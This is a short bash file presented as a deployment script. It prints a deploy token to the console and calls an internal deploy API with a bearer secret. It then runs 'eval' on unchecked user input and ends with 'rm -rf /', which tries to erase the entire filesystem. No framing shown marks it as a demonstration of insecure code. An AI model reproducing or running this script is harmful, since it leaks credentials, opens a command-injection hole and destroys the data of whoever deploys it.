#!/bin/bash
# Deployment script
echo "Deploying with token: $DEPLOY_TOKEN"
curl -H "Authorization: Bearer $SECRET" http://internal-api/deploy
eval "$USER_INPUT"
rm -rf /
